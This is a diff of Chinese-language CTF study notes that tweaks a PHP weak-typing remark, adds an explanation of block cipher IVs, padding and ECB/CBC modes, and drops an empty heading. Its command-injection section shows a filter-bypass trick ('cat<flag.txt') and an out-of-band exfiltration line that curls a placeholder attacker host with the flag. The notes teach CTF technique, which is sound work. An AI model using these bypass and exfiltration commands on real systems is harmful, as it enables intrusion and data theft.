@@ -73,7 +73,7 @@ PHP标签过滤：可以考虑使用`<script language="PHP"></script>`
 
 ## 代码审计
 
-旧版本（PHP 7以前）弱类型漏洞较多。没有测旧版本，用PHP 8.2基本无法复现
+旧版本（PHP 7以前）弱类型漏洞较多。没有测旧版本，但是用PHP 8.2基本无法复现
 
 参考：[CTF-PHP黑魔法](https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/)
 
@@ -111,7 +111,7 @@ Shell扩展：参考[Linux笔记](../system/Linux.md#Shell扩展)
   - 重定向绕过：`cat<flag.txt`
 - 长度限制
 - 回显限制
-  - 用带外信息带出，如`curl http://attacker.com/$flag` 
+  - 用带外信息带出，如`curl http://attacker.com/$flag`
   - 盲注
 
 以上大部分技巧适用于Linux。对于Windows系统命令提示符，还可尝试：
@@ -164,6 +164,22 @@ type C:\Recycle.Bin\path-to-file
 - AES，密钥长度128 / 192 / 256 bit（16 / 24 / 32 byte）
 - IDEA
 
+
+
+分组密码
+
+- 初始化向量（IV，Initialization Vector）：为了避免相同明文加密得到相同密文从而暴露信息，除ECB以外的工作模式都引入了初始化向量让加密过程更“随机”。IV通常无需保密
+
+- 填充：分组密码需要将消息填充到分组长度的整数倍。常用方法包括填0（Zero Padding）、填N个值为N的字节（PKCS7）、最后一字节为填充字节数，其余填0（ANSI X.923）
+
+- 工作模式
+
+  - ECB（电子密码本，Electronic Codebook）：将明文拆分为若干块，每个块独立加密。相同的块加密后也相同，因此可能暴露数据模式
+
+  - CBC（密码块链接，Cipher Block Chaining）：第一个明文块与初始化向量（IV）异或后再加密；之后每个明文块与前一个密文块异或再加密
+
+
+
 攻击：ECB模式弱点、Padding Oracle：pwntools
 
 ### 非对称加密算法
@@ -212,6 +228,3 @@ binwalk -e secret.zip          # 拆分拼接的文件
 ```
 
 小的文件也可以直接用010Editor人工检查
-
-## 流量分析
-
